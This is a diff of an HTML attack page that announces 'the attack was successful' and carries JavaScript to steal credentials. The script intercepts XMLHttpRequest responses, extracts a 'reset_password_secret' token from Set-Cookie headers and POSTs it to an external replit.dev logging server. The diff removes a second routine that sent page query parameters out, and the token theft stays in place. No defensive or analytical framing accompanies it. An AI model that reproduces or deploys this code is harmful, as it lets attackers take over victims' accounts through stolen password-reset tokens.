@@ -10,23 +10,9 @@
     <p>If you see this page, the attack was successful.</p>
 
     <script>
-        // Function to get query parameters
-        function getQueryParams() {
-            const params = {};
-            const queryString = window.location.search.substring(1);
-            const queries = queryString.split("&");
-            for (let i = 0; i < queries.length; i++) {
-                const pair = queries[i].split("=");
-                params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
-            }
-            return params;
-        }
-
-        // Function to log data to a remote server using a POST request
         function logData(data) {
             const xhr = new XMLHttpRequest();
-            const logUrl = 'https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log'; // Repl.it logging server URL
-            xhr.open("POST", logUrl, true);
+            xhr.open("POST", 'https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log', true);
             xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
@@ -36,7 +22,6 @@
             xhr.send(JSON.stringify(data));
         }
 
-        // Function to log the response token
         function interceptResponse() {
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
@@ -44,8 +29,9 @@
                     if (this.readyState === 4 && this.status === 201) {
                         try {
                             const response = JSON.parse(this.responseText);
-                            if (response.ok && this.getResponseHeader('Set-Cookie')) {
-                                const cookies = this.getResponseHeader('Set-Cookie').split(';');
+                            const setCookieHeader = this.getResponseHeader('Set-Cookie');
+                            if (setCookieHeader) {
+                                const cookies = setCookieHeader.split(';');
                                 cookies.forEach(cookie => {
                                     if (cookie.includes('reset_password_secret=')) {
                                         const token = cookie.split('=')[1];
@@ -62,12 +48,7 @@
             };
         }
 
-        // Initialize interception
         interceptResponse();
-
-        // Get and log the query parameters
-        const queryParams = getQueryParams();
-        logData(queryParams);
     </script>
 </body>
 </html>
